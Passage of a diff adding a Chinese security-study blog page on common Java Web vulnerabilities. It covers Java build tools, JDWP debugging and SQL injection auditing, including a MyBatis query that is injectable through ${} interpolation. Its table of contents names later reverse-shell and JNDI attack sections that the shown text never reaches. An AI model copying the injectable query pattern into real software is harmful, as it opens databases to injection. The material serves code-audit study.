@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hexo">
+<title>Java Web 常见漏洞 - swfk 的安全笔记</title>
+<meta name="description" content="Fastjson、Log4j2、Shiro、Spring 等典型 Java 组件漏洞的原理、探测与利用要点。">
+<meta name="author" content="swfk2154">
+<meta name="keywords" content="AI安全, 网络安全, 大模型安全, LLM安全, 渗透测试, 安全运营">
+<meta name="theme-color" id="theme-color" content="#f8f7f4">
+<link rel="icon" type="image/svg+xml" href="/images/clay-avatar.svg">
+<link rel="apple-touch-icon" href="/icon.png">
+<link rel="canonical" href="https://blogbu2154.site/java-web-vulnerabilities/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java Web 常见漏洞 - swfk 的安全笔记">
+<meta property="og:description" content="Fastjson、Log4j2、Shiro、Spring 等典型 Java 组件漏洞的原理、探测与利用要点。">
+<meta property="og:url" content="https://blogbu2154.site/java-web-vulnerabilities/">
+<meta property="og:site_name" content="swfk 的安全笔记">
+<meta property="og:image" content="/medias/featureimages/19.jpg">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/atom+xml" title="swfk 的安全笔记" href="/atom.xml">
+<link rel="stylesheet" href="/css/clay.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+
+<script>
+  // 尽早恢复主题，避免首屏闪烁
+  (function () {
+    try {
+      var t = localStorage.getItem('clay-theme') ||
+        (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+      document.documentElement.dataset.theme = t;
+    } catch (e) {
+      document.documentElement.dataset.theme = 'light';
+    }
+  })();
+</script>
+
+
+<body class="">
+  <a class="skip-link" href="#main">跳到正文</a>
+  <header class="site-nav">
+  <nav class="site-nav__pill" aria-label="主导航">
+    
+      
+        <a href="/" class="">首页</a>
+      
+        <a href="/archives" class="">归档</a>
+      
+        <a href="/categories" class="">分类</a>
+      
+        <a href="/tags" class="">标签</a>
+      
+        <a href="/about" class="">关于</a>
+      
+    
+    
+      <button type="button" class="site-nav__icon" data-search-open aria-label="站内搜索">
+        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </button>
+      <a class="site-nav__icon" href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+        <svg class="icon-github" viewBox="0 0 24 24" width="26" height="26" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+      </a>
+    
+    <button type="button" class="site-nav__icon theme-toggle" data-theme-toggle aria-label="切换主题">
+      <svg class="theme-toggle__moon" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg>
+      <svg class="theme-toggle__sun" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+    </button>
+  </nav>
+</header>
+
+  <main id="main">
+    
+<div class="reading-progress" aria-hidden="true"><span data-reading-progress></span></div>
+<article class="article article--toc">
+  <div class="article__body">
+    
+
+<aside class="article__aside">
+  <div class="toc-box">
+    <div class="toc-box__title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-text">Java  动态调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java-%E7%AE%80%E4%BB%8B"><span class="toc-text">java 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%EF%BC%9A"><span class="toc-text">编译型语言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80"><span class="toc-text">解释型语言</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%9E%84%E5%BB%BA"><span class="toc-text">Java 项目的构建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDEA"><span class="toc-text">IDEA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#maven"><span class="toc-text">maven</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pom-xml"><span class="toc-text">pom.xml</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">生命周期</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDWP"><span class="toc-text">JDWP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDEA-%E5%92%8C-JDWP-%E8%81%94%E7%94%A8"><span class="toc-text">IDEA 和 JDWP 联用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E4%BB%A3%E7%A0%81-%EF%BC%88%E6%8E%A5%E5%8F%A3%E6%9F%A5%E6%89%BE%EF%BC%89"><span class="toc-text">怎么找到对应代码 （接口查找）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-text">Java Web常见漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">1 SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JDBC-%E6%B3%A8%E5%85%A5"><span class="toc-text">JDBC 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E8%A7%84%E5%88%99"><span class="toc-text">审计规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%EF%BC%9Aspingboot-%E6%A6%82%E8%BF%B0"><span class="toc-text">拓展：spingboot 概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E5%8F%A3uri-%E6%80%8E%E4%B9%88%E6%8B%BC%E6%8E%A5"><span class="toc-text">接口uri 怎么拼接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E7%A1%AE%E5%AE%9A%E5%8F%82%E6%95%B0%E7%9A%84%E9%94%AE%E5%90%8D"><span class="toc-text">怎么确定参数的键名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mybatis-%E6%B3%A8%E5%85%A5"><span class="toc-text">mybatis 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E8%A7%A3%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">注解类型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E4%BE%9D%E6%8D%AE%EF%BC%9A"><span class="toc-text">判断依据：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E6%B3%A8%E8%A7%A3%E4%B8%AD%E7%9A%84-SQL-%E8%AF%AD%E5%8F%A5"><span class="toc-text">找到注解中的 SQL 语句</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8-PathVariables-%E5%8F%82%E6%95%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">怎么利用 PathVariables 参数SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87-uri-%E4%BC%A0%E5%8F%82%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-text">直接通过 uri 传参的方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap"><span class="toc-text">sqlmap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8-order-by-%E6%B3%A8%E5%85%A5"><span class="toc-text">怎么利用 order by 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A81%EF%BC%9A%E9%81%8D%E5%8E%86%E5%8F%82%E6%95%B0%E6%B5%8B%E5%87%BA%E5%88%97%E6%95%B0"><span class="toc-text">利用1：遍历参数测出列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A82%EF%BC%9A-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">利用2： 时间盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">XML类型注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">2  任意文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">3  任意文件读取、任意文件下载、目录遍历</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-jwt-json-web-token-%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3"><span class="toc-text">4  jwt json web token 安全隐患</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt-%E7%AE%80%E4%BB%8B"><span class="toc-text">jwt 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt-%E7%9A%84%E7%89%B9%E5%BE%81%E5%92%8C%E6%9E%84%E9%80%A0"><span class="toc-text">jwt 的特征和构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt-%E6%9C%89%E5%93%AA%E4%BA%9B%E9%9A%90%E6%82%A3"><span class="toc-text">jwt 有哪些隐患</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#springboot-actuator-%E6%B3%84%E9%9C%B2"><span class="toc-text">springboot actuator 泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt-%E4%BC%AA%E9%80%A0"><span class="toc-text">jwt 伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-SSRF"><span class="toc-text">5 SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-file"><span class="toc-text">利用 - file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-http"><span class="toc-text">利用 - http:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-netdoc"><span class="toc-text">利用 - netdoc:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-RCE"><span class="toc-text">6 RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Runtime-getRuntime-exec"><span class="toc-text">Runtime.getRuntime().exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-%E5%93%AA%E4%BA%9B%E7%B1%BB%E5%92%8C%E6%96%B9%E6%B3%95%E8%83%BD%E5%AE%9E%E7%8E%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">java 哪些类和方法能实现执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nashorn-%E5%88%A9%E7%94%A8%E4%B8%BE%E4%BE%8B"><span class="toc-text">nashorn 利用举例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%BC%96%E5%86%99%E6%81%B6%E6%84%8F%E7%9A%84js-%E4%BB%A3%E7%A0%81-1-js"><span class="toc-text">1  编写恶意的js 代码 1.js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%BC%80%E5%90%AF-http-%E7%9B%91%E5%90%AC-%EF%BC%88%E7%94%A8%E4%BA%8E%E4%B8%8B%E8%BD%BDjs%E6%96%87%E4%BB%B6%EF%BC%89%E5%92%8C-nc-tcp-%E7%9B%91%E5%90%AC%EF%BC%88%E7%94%A8%E4%BA%8E%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-text">2  开启 http 监听 （用于下载js文件）和 nc tcp 监听（用于反弹shell）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%BD%91%E7%AB%99"><span class="toc-text">3  攻击目标网站</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-XXE"><span class="toc-text">7 XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90xml%E7%9A%84%E7%B1%BB"><span class="toc-text">解析xml的类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-xxe-%E5%88%A9%E7%94%A8"><span class="toc-text">java xxe 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-text">有回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%88%E7%9B%B2%E6%89%93xxe%EF%BC%89"><span class="toc-text">无回显（盲打xxe）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-JNDI-%E6%B3%A8%E5%85%A5"><span class="toc-text">8  JNDI 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-text">JNDI注入漏洞：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="toc-text">JNDI 漏洞攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reference%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E7%B1%BB"><span class="toc-text">reference远程加载类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%9A%84jndi%E6%B3%A8%E5%85%A5-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-BeanFactory"><span class="toc-text">高版本jdk的jndi注入 - Java反序列化 &#x2F; BeanFactory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rmi-%E5%8D%8F%E8%AE%AE%E6%9C%AC%E8%BA%AB%E5%B0%B1%E6%98%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">rmi 协议本身就是反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E6%96%B0%E7%89%88jdk%E9%87%87%E5%8F%96%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-text">最新版jdk采取的修复与防御措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reference%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E7%B1%BB-1"><span class="toc-text">reference远程加载类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%9A%84jndi%E6%B3%A8%E5%85%A5-BeanFactory"><span class="toc-text">高版本jdk的jndi注入 - BeanFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%9A%84jndi%E6%B3%A8%E5%85%A5-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">高版本jdk的jndi注入 - Java反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E6%96%B0%E7%89%88jdk%E9%87%87%E5%8F%96%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD-1"><span class="toc-text">最新版jdk采取的修复与防御措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA-JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7"><span class="toc-text">攻击演示-JNDI注入工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA%E4%B8%AD%E8%BF%90%E8%A1%8C"><span class="toc-text">1  在攻击机中运行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA%E4%B8%AD%E8%BF%90%E8%A1%8C"><span class="toc-text">2  在攻击机中运行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%BD%91%E7%AB%99-1"><span class="toc-text">3  攻击目标网站</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA-Javachains-%E5%B7%A5%E5%85%B7"><span class="toc-text">攻击演示-Javachains 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8JNDI-Control"><span class="toc-text">启动JNDI Control</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-Basic-Payload"><span class="toc-text">JNDI Basic Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDIResourceRefPayload"><span class="toc-text">JNDIResourceRefPayload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-LDAP-Deserialized-Payload"><span class="toc-text">JNDI LDAP Deserialized Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-RMI-Deserialized-Payload"><span class="toc-text">JNDI RMI Deserialized Payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%EF%BC%88readObject%EF%BC%89"><span class="toc-text">9  Java反序列化 （readObject）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-text">攻击流程 - 反序列化链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ysoserial"><span class="toc-text">ysoserial</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URLDNS-%E9%93%BE"><span class="toc-text">URLDNS 链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CB1-%E9%93%BE"><span class="toc-text">CB1 链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-java-chains"><span class="toc-text">攻击流程 - java chains</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%8E%9F%E7%90%86-CC1"><span class="toc-text">利用链原理 - CC1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%8E%9F%E7%90%86-URLDNS"><span class="toc-text">利用链原理 - URLDNS</span></a></li></ol>
+  </div>
+</aside>
+
+
+    <div class="article__main">
+      <header class="article__header reveal">
+        <p class="eyebrow">网络安全</p>
+        <h1>Java Web 常见漏洞</h1>
+        <div class="post-meta">
+          <time datetime="2025-12-29">2025-12-29</time>
+          
+            <span>更新于 2026-08-29</span>
+          
+        </div>
+      </header>
+      
+        <figure class="article__cover reveal"><img src="/medias/featureimages/19.jpg" alt="Java Web 常见漏洞" loading="eager" onerror="this.parentElement.style.display='none'"></figure>
+      
+      <div class="post-content reveal">
+        <blockquote>
+<p>本篇整理自我的语雀学习笔记（课堂学习与实操记录），已转为纯文字版并按博客格式排版。</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="Java-动态调试"><a href="#Java-动态调试" class="headerlink" title="Java  动态调试"></a>Java  动态调试</h2><h2 id="java-简介"><a href="#java-简介" class="headerlink" title="java 简介"></a>java 简介</h2><p>编译型语言和解释型语言的区别？</p>
+<h3 id="编译型语言："><a href="#编译型语言：" class="headerlink" title="编译型语言："></a>编译型语言：</h3><p>不能直接运行，需要预先编译成可执行程序 （PE、ELF）</p>
+<p><strong>可执行程序（PE &#x2F; ELF）</strong> 是操作系统加载并运行的二进制文件格式 ( 可执行程序是<strong>操作系统能够直接加载到内存并执行的文件</strong>)</p>
+<ul>
+<li>C -&gt; 编译-&gt; PE&#x2F;ELF -&gt; 运行</li>
+<li>Go</li>
+<li>Rust</li>
+</ul>
+<h3 id="解释型语言"><a href="#解释型语言" class="headerlink" title="解释型语言"></a>解释型语言</h3><p>由解释器或运行时直接运行</p>
+<ul>
+<li>Python -&gt; python 解释器 直接运行</li>
+<li>PHP</li>
+<li>JavaScript</li>
+</ul>
+<p>Java：既不是编译型语言，也不是解释型语言</p>
+<p>Java -&gt; javac编译-&gt; class 文件 -&gt; jvm 解释运行</p>
+<p><strong>JDK（Java Development Kit）</strong> 是 <strong>Java 开发工具包</strong>，是用于开发和运行 Java 应用程序的<strong>完整软件开发环境</strong></p>
+<p>Java、 Kotlin 、Groovy 都是java，Java就是Java，Kotlin 是开发安卓的Java、Groovy是java脚本用来构建Gradle</p>
+<p>“<strong>空安全</strong>”（Null Safety）是现代编程语言中用于<strong>防止空指针异常</strong>的一种语言级机制。它通过<strong>在编译期强制检查变量是否可能为 null</strong>，从而避免程序在运行时因访问 null 值而崩溃。</p>
+<h2 id="Java-项目的构建"><a href="#Java-项目的构建" class="headerlink" title="Java 项目的构建"></a>Java 项目的构建</h2><h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h2><p><a target="_blank" rel="noopener" href="https://www.jetbrains.com/idea/">https://www.jetbrains.com/idea/</a></p>
+<h2 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h2><p>Maven 是项目管理和构建自动化工具</p>
+<p>Maven 和 Gradle 是真正的构建系统（Build System），而 IntelliJ 是一个 集成开发环境（IDE），不是构建工具。</p>
+<h2 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h2><p> java依赖库的名字和版本 （代码审计的关键， java 依赖库可能有历史漏洞 [比如 log4j2、shiro、 fastjson，都是依赖库出现的漏洞]</p>
+<p><code>pom.xml</code> 是 <strong>Apache Maven</strong> 构建工具的核心配置文件，全称为 <strong>Project Object Model</strong>（项目对象模型）。它是一个 <strong>XML 文件</strong>，用于定义 Java 项目的结构、依赖、插件、构建流程等信息。Maven 通过读取 <code>pom.xml</code> 来自动化完成编译、测试、打包、部署等任务。</p>
+<h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>package 打包：自动把 java 代码编译为 Class 文件后，再打包成 jar 文件，使用者通过 java -jar 命令就能运行 java 了</p>
+<h2 id="JDWP"><a href="#JDWP" class="headerlink" title="JDWP"></a>JDWP</h2><p>JDWP：Java远程调试协议 ，是Java 虚拟机（JVM）与调试器（如 IntelliJ IDEA、Eclipse 或 GDB）之间进行通信的“语言 ，默认的监听端口是 5005</p>
+<h2 id="IDEA-和-JDWP-联用"><a href="#IDEA-和-JDWP-联用" class="headerlink" title="IDEA 和 JDWP 联用"></a>IDEA 和 JDWP 联用</h2><h2 id="怎么找到对应代码-（接口查找）"><a href="#怎么找到对应代码-（接口查找）" class="headerlink" title="怎么找到对应代码 （接口查找）"></a>怎么找到对应代码 （接口查找）</h2><p>以 JDBC sql注入举例</p>
+<h2 id="Java-Web常见漏洞"><a href="#Java-Web常见漏洞" class="headerlink" title="Java Web常见漏洞"></a>Java Web常见漏洞</h2><h2 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1 SQL注入"></a>1 SQL注入</h2><h3 id="JDBC-注入"><a href="#JDBC-注入" class="headerlink" title="JDBC 注入"></a>JDBC 注入</h3><p>JDBC（Java Database Connectivity）是 Java 语言中用来规范客户端程序如何访问数据库的应用程序接口， 比如 java 想要连接mysql、mssql 、Oracle 就可以使用jdbc</p>
+<h3 id="审计规则"><a href="#审计规则" class="headerlink" title="审计规则"></a>审计规则</h3><p>1  在入口点下断点</p>
+<p>2  步过，看输入的参数是否能够到达SQL语句中，且到达SQL语句时，有没有变化</p>
+<ul>
+<li>✅能够到达SQL语句</li>
+<li>✅没变化 则说明有SQL注入漏洞</li>
+</ul>
+<h3 id="拓展：spingboot-概述"><a href="#拓展：spingboot-概述" class="headerlink" title="拓展：spingboot 概述"></a>拓展：spingboot 概述</h3><h4 id="接口uri-怎么拼接"><a href="#接口uri-怎么拼接" class="headerlink" title="接口uri 怎么拼接"></a>接口uri 怎么拼接</h4><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">RequestMapping</span>(<span class="hljs-string">&quot;/vulnapi/sqli/jdbc&quot;</span>)
+@<span class="hljs-title function_ invoke__">GetMapping</span>(<span class="hljs-string">&quot;/vul2&quot;</span>)
+
+拼接起来即可 /vulnapi/sqli/jdbc/vul2</code></pre>
+
+<h4 id="怎么确定参数的键名"><a href="#怎么确定参数的键名" class="headerlink" title="怎么确定参数的键名"></a>怎么确定参数的键名</h4><pre><code class="hljs php"><span class="hljs-keyword">public</span> String <span class="hljs-title function_ invoke__">vul2</span>(String id)
+参数就是id</code></pre>
+
+<pre><code class="hljs php"><span class="hljs-keyword">public</span> String <span class="hljs-title function_ invoke__">safe5</span>(String name)
+参数就是name</code></pre>
+
+<h3 id="mybatis-注入"><a href="#mybatis-注入" class="headerlink" title="mybatis 注入"></a>mybatis 注入</h3><p>mybatis是一款用于持久层的、轻量级的半自动化<strong>ORM框架</strong>，封装了所有jdbc操作以及设置查询 参数和获取结果集的操作</p>
+<h3 id="注解类型注入"><a href="#注解类型注入" class="headerlink" title="注解类型注入"></a>注解类型注入</h3><p>mybatis 支持注解类型的SQL 语句</p>
+<h4 id="判断依据："><a href="#判断依据：" class="headerlink" title="判断依据："></a>判断依据：</h4><h4 id="找到注解中的-SQL-语句"><a href="#找到注解中的-SQL-语句" class="headerlink" title="找到注解中的 SQL 语句"></a>找到注解中的 SQL 语句</h4><ul>
+<li>如果SQL语句中的参数使用 ${} 包裹，则基本有SQL注入漏洞</li>
+<li>如果SQL语句中的参数使用 #{} 包裹，则mybatis自动进行SQL语句预处理，没有SQL注入</li>
+</ul>
+<pre><code class="hljs xml">@Select(&quot;select * from users where id = $&#123;id&#125;&quot;)
+List<span class="hljs-tag">&lt;<span class="hljs-name">User</span>&gt;</span> queryByIdAsInterger(@Param(&quot;id&quot;) Integer id);
+
+不存在sql注入漏洞，原因是使用了 $&#123;&#125;，但限制了id必须是 Integer 整数</code></pre>
+
+<pre><code class="hljs xml">@Select(&quot;select * from users where user = #&#123;user&#125;&quot;)
+List<span class="hljs-tag">&lt;<span class="hljs-name">UserIDOR</span>&gt;</span> queryByUser2(@Param(&quot;user&quot;) String user);
+
+不存在sql注入漏洞，原因是使用了 #&#123;&#125;</code></pre>
+
+<pre><code class="hljs xml">@Select(&quot;select * from users where id = $&#123;id&#125;&quot;)
+List<span class="hljs-tag">&lt;<span class="hljs-name">User</span>&gt;</span> queryByIdAsString(@Param(&quot;id&quot;) String id);
+
+存在sql注入漏洞，原因是使用了 $&#123;&#125;</code></pre>
